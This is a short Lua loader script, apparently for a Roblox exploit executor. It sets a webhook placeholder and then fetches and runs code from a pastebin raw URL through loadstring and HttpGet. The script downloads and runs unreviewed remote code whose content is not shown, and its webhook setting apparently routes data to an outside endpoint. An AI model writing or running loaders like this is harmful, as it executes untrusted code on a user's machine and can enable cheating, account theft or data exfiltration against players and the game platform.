if not game:IsLoaded() then game.Loaded:Wait() end
wait(2.5)
getgenv().webhook = "webhook here"
loadstring(game:HttpGet("https://pastebin.com/raw/XDxsEa63"))()